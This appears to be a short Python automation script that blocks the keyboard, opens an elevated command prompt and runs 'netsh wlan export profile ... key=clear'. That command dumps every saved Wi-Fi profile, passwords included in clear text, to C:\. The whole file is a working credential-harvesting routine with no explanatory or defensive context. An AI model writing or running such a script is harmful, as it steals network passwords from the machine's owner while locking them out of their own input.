import pyautogui
import time
import keyboard


for i in range(150):
	keyboard.block_key(i)

pyautogui.hotkey('win','r')
pyautogui.write('cmd')
pyautogui.hotkey('ctrl','shift','enter')
time.sleep(0.5)
pyautogui.typewrite("netsh wlan export profile folder=C:\\ key=clear")
pyautogui.press('enter')

